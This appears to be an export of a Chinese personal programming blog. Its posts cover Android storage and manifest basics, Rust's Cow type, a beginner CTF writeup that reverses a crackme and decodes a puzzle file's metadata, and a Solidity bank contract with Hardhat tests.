<li><strong>公有目录</strong>：如 <code>Downloads/</code>、<code>DCIM/</code> 等，通过 <code>Environment.getExternalStoragePublicDirectory()</code> 访问，需动态申请 <code>READ_EXTERNAL_STORAGE</code>&#x2F;<code>WRITE_EXTERNAL_STORAGE</code> 权限。</li>
<li><strong>作用域存储（Scoped Storage）</strong>：Android 10+ 限制直接访问公有目录，需通过 <code>MediaStore</code> 或存储访问框架（SAF）操作文件。</li>
</ul>
</li>
</ul>
<h3 id="2-二进制文件的执行权限问题"><a href="#2-二进制文件的执行权限问题" class="headerlink" title="2. 二进制文件的执行权限问题"></a><strong>2. 二进制文件的执行权限问题</strong></h3><ul>
<li>技术点：<ul>
<li><strong>NDK&#x2F;JNI</strong>：原生二进制文件（如 <code>.so</code> 库）需放在 <code>jniLibs/</code> 目录，自动打包到 APK。</li>
<li><strong>权限控制</strong>：Android 不允许直接执行外部存储中的二进制文件（如下载的 <code>.so</code> 或可执行文件），需先复制到私有目录（<code>/data/data/</code>）并通过 <code>chmod</code> 赋予执行权限。</li>
<li><strong>安全风险</strong>：动态加载外部代码需谨慎，避免恶意代码注入。</li>
</ul>
</li>
</ul>
<h3 id="3-AndroidManifest-xml-的重要性和使用方法"><a href="#3-AndroidManifest-xml-的重要性和使用方法" class="headerlink" title="3. AndroidManifest.xml 的重要性和使用方法"></a><strong>3. AndroidManifest.xml 的重要性和使用方法</strong></h3><ul>
<li>关键技术：<ul>
<li><strong>四大组件声明</strong>：<code>&lt;activity&gt;</code>、<code>&lt;service&gt;</code>、<code>&lt;receiver&gt;</code>、<code>&lt;provider&gt;</code> 必须在此注册。</li>
<li><strong>权限管理</strong>：声明应用所需权限（如 <code>&lt;uses-permission android:name=&quot;android.permission.CAMERA&quot;/&gt;</code>）。</li>
<li><strong>Intent Filter</strong>：定义组件响应隐式 Intent 的规则（如主 Activity 的 <code>LAUNCHER</code> 类别）。</li>
<li><strong>应用配置</strong>：包名、版本号、SDK 版本限制（<code>&lt;uses-sdk&gt;</code>）、硬件特性要求（如 <code>&lt;uses-feature&gt;</code>）。</li>
<li><strong>特殊属性</strong>：<code>android:exported</code> 控制组件是否允许外部应用访问（Android 12+ 强化限制）。</li>
</ul>
</li>
</ul>
<h3 id="4-buildFeatures-viewBinding-true"><a href="#4-buildFeatures-viewBinding-true" class="headerlink" title="4. buildFeatures { viewBinding true }"></a><strong>4. buildFeatures { viewBinding true }</strong></h3><ul>
<li>技术点：<ul>
<li><strong>视图绑定（ViewBinding）</strong>：替代 <code>findViewById</code>，为每个 XML 布局生成绑定类，提供类型安全的视图引用。</li>
<li><strong>启用方式</strong>：在 <code>build.gradle</code> 中配置：</li>
</ul>
</li>
</ul>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    buildFeatures &#123;</span><br><span class="line">        viewBinding <span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>优势</strong>：避免空指针异常，减少模板代码；与 DataBinding 相比无性能开销（但缺少数据绑定功能）。</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> binding: ActivityMainBinding</span><br><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">    binding = ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">    setContentView(binding.root)</span><br><span class="line">    binding.textView.text = <span class="string">&quot;Hello ViewBinding!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Kotlin</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-9-9-Rust中的智能指针Cow</title>
    <url>/2025/09/09/2025-9-9-Rust%E4%B8%AD%E7%9A%84%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88Cow/</url>
    <content><![CDATA[<h1 id="Rust中的智能指针-Cow"><a href="#Rust中的智能指针-Cow" class="headerlink" title="Rust中的智能指针 Cow"></a>Rust中的智能指针 Cow</h1><p>全称：<code>std::borrow::Cow&lt;&#39;a, B&gt;</code></p>
<p>理解： 名称 Cow 参数  <code>&#39;a</code> 为生命周期参数 <code>B</code> 为基础参数</p>
<p>Rust规定 枚举 都必须至少有一个变体 </p>
<p>Cow 拥有两个变体</p>
<ul>
<li><code>Borrowed(&amp;&#39;a B)</code>：表示对数据的不可变借用。</li>
<li><code>Owned(&lt;B as ToOwned&gt;::Owned)</code>：表示拥有数据的克隆副本。</li>
</ul>
<p>用法：处理可能来自借用或拥有的数据，避免非必要克隆。</p>
<ul>
<li>Cow 实现了 <code>Deref</code></li>
<li>需要可变性时，Cow会自动克隆（写时）</li>
</ul>
<h3 id="用例："><a href="#用例：" class="headerlink" title="用例："></a>用例：</h3><ol>
<li><strong>避免不必要的字符串克隆</strong>：例如，处理输入可能是 <code>&amp;str</code> 或 <code>String</code> 的情况。</li>
<li><strong>优化函数返回类型</strong>：函数可能返回借用或拥有的数据，取决于条件。</li>
<li><strong>处理配置或默认值</strong>：避免复制默认值，除非需要修改。</li>
</ol>
<p>示例：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::borrow::Cow;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例1：函数返回 Cow，避免不必要的克隆</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">process_input</span>(input: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> Cow&lt;<span class="type">str</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> input.<span class="title function_ invoke__">contains</span>(<span class="string">&quot;special&quot;</span>) &#123;</span><br><span class="line">        Cow::<span class="title function_ invoke__">Owned</span>(input.<span class="title function_ invoke__">to_uppercase</span>()) <span class="comment">// 需要修改，所以克隆</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cow::<span class="title function_ invoke__">Borrowed</span>(input) <span class="comment">// 直接借用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例2：使用 Cow 处理默认值</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_config_value</span>(setting: <span class="type">Option</span>&lt;<span class="type">String</span>&gt;) <span class="punctuation">-&gt;</span> Cow&lt;<span class="type">str</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> setting &#123;</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(s) =&gt; Cow::<span class="title function_ invoke__">Owned</span>(s),</span><br><span class="line">        <span class="literal">None</span> =&gt; Cow::<span class="title function_ invoke__">Borrowed</span>(<span class="string">&quot;default_value&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input1</span> = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result1</span> = <span class="title function_ invoke__">process_input</span>(input1);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Result1: &#123;&#125;&quot;</span>, result1); <span class="comment">// 借用，无克隆</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input2</span> = <span class="string">&quot;special input&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result2</span> = <span class="title function_ invoke__">process_input</span>(input2);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Result2: &#123;&#125;&quot;</span>, result2); <span class="comment">// 克隆并修改</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">config1</span> = <span class="title function_ invoke__">get_config_value</span>(<span class="title function_ invoke__">Some</span>(<span class="string">&quot;custom&quot;</span>.<span class="title function_ invoke__">to_string</span>()));</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">config2</span> = <span class="title function_ invoke__">get_config_value</span>(<span class="literal">None</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Config1: &#123;&#125;, Config2: &#123;&#125;&quot;</span>, config1, config2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>Rust</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-9-3-市赛wp</title>
    <url>/2025/09/03/2025-9-3-%E5%B8%82%E8%B5%9Bwp/</url>
    <content><![CDATA[<h3 id="CRACKME-WP"><a href="#CRACKME-WP" class="headerlink" title="CRACKME WP"></a>CRACKME WP</h3><p>这题是逆向题</p>
<p>我们先下载拿到题目 4.crackme.exe</p>
<p><img src="/img/images/%E5%9B%BE%E7%89%871.png" alt="img"></p>
<p>导入IDA后进入题目</p>
<p><img src="/img/images/%E5%9B%BE%E7%89%872.png" alt="img"></p>
<p>观察题目发现是对比字符串</p>
<p>猜测密文就是flag</p>
<p>观察流程图</p>
<p><img src="/img/images/%E5%9B%BE%E7%89%873.png" alt="img"></p>
<p>观察汇编代码</p>
<p>我们尝试搜索字符串</p>
<p><img src="/img/images/%E5%9B%BE%E7%89%874.png" alt="img"></p>
<p>确定代码</p>
<p><img src="/img/images/%E5%9B%BE%E7%89%875.png" alt="img"></p>
<p>生成伪C代码</p>
<p><img src="/img/images/%E5%9B%BE%E7%89%876.png" alt="img"></p>
<p>发现加密后的密文 :C T2V&lt;S7\+[4U&gt;Z*A</p>
<p>但加密是可逆的</p>
<p>重点观察函数encrypt</p>
<p><img src="/img/images/%E5%9B%BE%E7%89%877.png" alt="img"></p>
<p>根据逻辑写出解密代码</p>
<p>这个是 ****流密码加密****，使用前一个字节的加密结果作为下一个字节的密钥</p>
<p><img src="/img/images/%E5%9B%BE%E7%89%878.png" alt="img"></p>
<p>破解代码</p>
<p>运行得到flag</p>
<p> <img src="/img/images/%E5%9B%BE%E7%89%879.png" alt="img"></p>
<p> 注意修改 \ 为x 符合flag提交格式</p>
<h3 id="量子迷宫"><a href="#量子迷宫" class="headerlink" title="量子迷宫"></a>量子迷宫</h3><p>解压题目发现两个文件</p>
<p> <img src="/img/images/%E5%9B%BE%E7%89%8710.png" alt="img"></p>
<p>文件内容：</p>
<p> <img src="/img/images/%E5%9B%BE%E7%89%8711.png" alt="img"></p>
<p>阅读文件内容</p>
<p><code>The full basis sequence is stored in the quantum system, but only a portion is revealed here as a hint.</code></p>
<p>告诉我们完整的量子态密码在系统中</p>
<p>我猜测在pdf的元数据中</p>
<p>使用 exiftool 查看元数据</p>
<p> <img src="/img/images/%E5%9B%BE%E7%89%8712.png" alt="img"></p>
<p>找到了关键信息 </p>
<p>1011100001101111100011100011101111011000011101101000100101001100110111100101011101010001100011110100</p>
<p>题目提示这个关键序列是一部分</p>
<p>所以 从量子系统推导出的基序列（1000位）应该与这个片段部分匹配</p>
<p>去搜了搜关键算法</p>
<p><strong>1.</strong> ****从*<em><strong>quantum_system.bin</strong></em>*推导基序列****：
每个字节（量子态）对应一个基：</p>
<p>o 如果量子态值为0或1（即Z基编码），则基为0（Z基）。</p>
<p>o 如果量子态值为2或3（即X基编码），则基为1（X基）。</p>
<p><strong>2.</strong> ****解码量子态得到原始密钥比特****：
对于每个量子态（索引i）：</p>
<p>o 如果基序列[i]为0（Z基）：</p>
<p>§ 量子态&#x3D;0 → 比特0</p>
<p>§ 量子态&#x3D;1 → 比特1</p>
<p>o 如果基序列[i]为1（X基）：</p>
<p>§ 量子态&#x3D;2 → 比特0</p>
<p>§ 量子态&#x3D;3 → 比特1</p>
<p>根据算法写出解密脚本</p>
<p>完整脚本截图如下</p>
<p> <img src="/img/images/%E5%9B%BE%E7%89%8713.png" alt="img"></p>
<p> <img src="/img/images/%E5%9B%BE%E7%89%8714.png" alt="img"></p>
<p>运行脚本得到flag</p>
<p> <img src="/img/images/%E5%9B%BE%E7%89%8715.png" alt="img"></p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-10-20-SimpleContract&amp;test</title>
    <url>/2025/10/20/2025-10-20-SimpleContract-test/</url>
    <content><![CDATA[<h2 id="智能合约开发与测试"><a href="#智能合约开发与测试" class="headerlink" title="智能合约开发与测试"></a>智能合约开发与测试</h2><h3 id="第1题：按要求完成智能合约开发开发与测"><a href="#第1题：按要求完成智能合约开发开发与测" class="headerlink" title="第1题：按要求完成智能合约开发开发与测"></a>第1题：按要求完成智能合约开发开发与测</h3><p>【要求】 使用Solidity 语言进行智能合约开发，根据需求用例文档在待补充源码中完 成程序接口功能的编码，解决代码错误和警告，正确编译合约，功能调试正确， 运行合约进行业务功能的验证，成功获取合约的abi，将合约部署至区块链，获 取部署的合约信息，将任务中编写代码、运行截图、部署至区块链截图保存至指 定位置。 </p>
<p>【任务】</p>
<p>1．完善bank合约开发，根据合约里面的代码注释，完善缺失的合约中缺失的代码。 </p>
<p>2．基于hardhat完成合约的功能测试，针对bank合约中的函数，完成功能测试 </p>
<p>3.针对bank合约中的withdraw函数，完成边界值测试 </p>
<p>要求：</p>
<p> 1.测试区块金额大于0的情况
 2.测试账户余额大于取款金额的情况</p>
<p> 3.测试账户存在的情况</p>
<hr>
<h3 id="作答"><a href="#作答" class="headerlink" title="作答"></a>作答</h3><p>只能自己想一个合约了</p>
<p>第一个合约叫 <code>Bank</code> 那就是和银行有关的</p>
<p>账户：开户，销户</p>
<p>存款：存钱，取钱，查询余额，转账</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.4.2;</span><br><span class="line"></span><br><span class="line">contract Bank2&#123;</span><br><span class="line"></span><br><span class="line">    struct Account&#123;</span><br><span class="line">        address owner;</span><br><span class="line">        uint balance;</span><br><span class="line">        uint time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; Account) public accounts; // 映射结构存储</span><br><span class="line"></span><br><span class="line">    // 创建账户的事件 提供监听</span><br><span class="line">    event AccountCreate(address account,uint time);</span><br><span class="line"></span><br><span class="line">    // 创建账户的函数</span><br><span class="line"></span><br><span class="line">    function createAccount() public&#123;</span><br><span class="line"></span><br><span class="line">        address account = msg.sender;</span><br><span class="line"></span><br><span class="line">        accounts[account] = Account(&#123;            </span><br><span class="line">            owner: account,</span><br><span class="line">            balance: 0,</span><br><span class="line">            time: now</span><br><span class="line">        &#125;);</span><br><span class="line">        AccountCreate(account,now);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function checkAccount(address account) public returns(bool)&#123;</span><br><span class="line">        return  accounts[account].owner != address(0); // 检查是不是空地址罢了</span><br><span class="line">    &#125;</span><br><span class="line">    // 存款</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line"></span><br><span class="line">        if (!checkAccount(msg.sender)) &#123;</span><br><span class="line">            createAccount();</span><br><span class="line">        &#125;</span><br><span class="line">        accounts[msg.sender].balance += msg.value;</span><br><span class="line">        accounts[msg.sender].time = now;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要写一个 <code>withdraw</code> 大概是提现函数的意思吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accounts[msg.sender].balance -= amount;</span><br><span class="line"></span><br><span class="line"> // 转账给用户</span><br><span class="line"> (bool success, ) = payable(msg.sender).call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line"> require(success, &quot;Withdrawal failed&quot;);</span><br></pre></td></tr></table></figure>

<hr>
<p>完善后的完整合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.4.20;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line"></span><br><span class="line">    struct Account &#123;</span><br><span class="line">        address owner;</span><br><span class="line">        uint balance;</span><br><span class="line">        uint time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; Account) public accounts;</span><br><span class="line"></span><br><span class="line">    // 事件声明</span><br><span class="line">    event AccountCreate(address account, uint time);</span><br><span class="line">    event WithdrawSuccess(address account, uint amount, uint time);</span><br><span class="line">    event WithdrawFailed(address account, uint amount, string reason, uint time);</span><br><span class="line"></span><br><span class="line">    // 创建账户</span><br><span class="line">    function createAccount() public &#123;</span><br><span class="line">        address account = msg.sender;</span><br><span class="line"></span><br><span class="line">        // 不允许重复创建账户</span><br><span class="line">        if (checkAccount(account)) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        accounts[account] = Account(&#123;            </span><br><span class="line">            owner: account,</span><br><span class="line">            balance: 0,</span><br><span class="line">            time: now</span><br><span class="line">        &#125;);</span><br><span class="line">        AccountCreate(account, now);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检查账户是否存在</span><br><span class="line">    function checkAccount(address account) public constant returns(bool) &#123;</span><br><span class="line">        return accounts[account].owner != address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 存款</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        if (!checkAccount(msg.sender)) &#123;</span><br><span class="line">            createAccount();</span><br><span class="line">        &#125;</span><br><span class="line">        accounts[msg.sender].balance += msg.value;</span><br><span class="line">        accounts[msg.sender].time = now;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检查余额</span><br><span class="line">    function checkBalance() public constant returns (uint) &#123;</span><br><span class="line">        address account = msg.sender;</span><br><span class="line">        if (!checkAccount(account)) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        return accounts[account].balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 完善的取款函数</span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        address account = msg.sender;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        // 1. 检查账户是否存在</span><br><span class="line">        if (!checkAccount(account)) &#123;</span><br><span class="line">            WithdrawFailed(account, amount, &quot;用户不存在&quot;, now);</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 2. 检查余额是否充足</span><br><span class="line">        if (accounts[account].balance &lt; amount) &#123;</span><br><span class="line">            WithdrawFailed(account, amount, &quot;余额不足&quot;, now);</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 3. 检查取款金额是否有效</span><br><span class="line">        if (amount == 0) &#123;</span><br><span class="line">            WithdrawFailed(account, amount, &quot;取款金额必须大于0&quot;, now);</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 4. 更新账户余额</span><br><span class="line">        accounts[account].balance -= amount;</span><br><span class="line">        accounts[account].time = now;</span><br><span class="line"></span><br><span class="line">        // 5. 转账给用户</span><br><span class="line">        if (!account.send(amount)) &#123;</span><br><span class="line">            // 如果转账失败，恢复余额</span><br><span class="line">            accounts[account].balance += amount;</span><br><span class="line">            WithdrawFailed(account, amount, &quot;转账失败&quot;, now);</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 6. 记录成功事件</span><br><span class="line">        WithdrawSuccess(account, amount, now);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint amount) public &#123;</span><br><span class="line">        address from = msg.sender;</span><br><span class="line">        </span><br><span class="line">        // 1. 检查发送方账户</span><br><span class="line">        if (!checkAccount(from)) &#123;</span><br><span class="line">            WithdrawFailed(from, amount, &quot;发送方账户不存在&quot;, now);</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 2. 检查接收方账户</span><br><span class="line">        if (!checkAccount(to)) &#123;</span><br><span class="line">            WithdrawFailed(from, amount, &quot;接收方账户不存在&quot;, now);</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 3. 检查转账金额是否有效</span><br><span class="line">        if (amount == 0) &#123;</span><br><span class="line">            WithdrawFailed(from, amount, &quot;转账金额必须大于0&quot;, now);</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 4. 检查发送方余额是否充足</span><br><span class="line">        if (accounts[from].balance &lt; amount) &#123;</span><br><span class="line">            WithdrawFailed(from, amount, &quot;发送方余额不足&quot;, now);</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 5. 更新余额</span><br><span class="line">        accounts[from].balance -= amount;</span><br><span class="line">        accounts[to].balance += amount;  // 关键：增加接收方余额</span><br><span class="line">        </span><br><span class="line">        // 3. 更新时间戳</span><br><span class="line">        accounts[from].time = now;</span><br><span class="line">        accounts[to].time = now;</span><br><span class="line">        </span><br><span class="line">        // 4. 记录事件</span><br><span class="line">        TransferSuccess(from, to, amount, now);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 转账成功事件</span><br><span class="line">    event TransferSuccess(address from, address to, uint amount, uint time);</span><br><span class="line"></span><br><span class="line">    // 获取账户信息</span><br><span class="line">    function getAccountInfo() public constant returns (address, uint, uint) &#123;</span><br><span class="line">        address account = msg.sender;</span><br><span class="line">        if (!checkAccount(account)) &#123;</span><br><span class="line">            return (address(0), 0, 0);</span><br><span class="line">        &#125;</span><br><span class="line">        return (accounts[account].owner, accounts[account].balance, accounts[account].time);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概要这么写，难说</p>
<p>边界值测试话 下界 上界 … 极端大值和极端小值</p>
<h3 id="基本功能测试"><a href="#基本功能测试" class="headerlink" title="基本功能测试"></a>基本功能测试</h3><p>测试代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Bank 合约&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> bank;</span><br><span class="line">    <span class="keyword">let</span> owner, user1, user2, user3;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">beforeEach</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        [owner, user1, user2, user3] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">Bank</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;Bank&quot;</span>);</span><br><span class="line">        bank = <span class="keyword">await</span> <span class="title class_">Bank</span>.<span class="title function_">deploy</span>();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;部署测试&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;成功部署合约&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">expect</span>(bank.<span class="property">address</span>).<span class="property">to</span>.<span class="property">not</span>.<span class="title function_">equal</span>(<span class="string">&quot;0x0000000000000000000000000000000000000000&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;账户管理&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;应该允许创建账户&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">createAccount</span>();</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">checkAccount</span>(user1.<span class="property">address</span>)).<span class="property">to</span>.<span class="property">be</span>.<span class="property">true</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;不允许重复创建账户&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">createAccount</span>();</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">expect</span>(bank.<span class="title function_">connect</span>(user1).<span class="title function_">createAccount</span>()).<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;存款测试&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;应该允许用户存款&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">createAccount</span>();</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">deposit</span>(&#123; <span class="attr">value</span>: <span class="number">100</span> &#125;);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;取款测试&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;应该允许用户取款&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">createAccount</span>();</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">deposit</span>(&#123; <span class="attr">value</span>: <span class="number">100</span> &#125;);</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">50</span>);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">50</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;转账测试&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;应该允许用户转账&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user2).<span class="title function_">createAccount</span>();</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">createAccount</span>();</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">deposit</span>(&#123; <span class="attr">value</span>: <span class="number">100</span> &#125;);</span><br><span class="line">            <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">transfer</span>(user2.<span class="property">address</span>, <span class="number">50</span>);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">50</span>);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user2).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">50</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试结果</p>
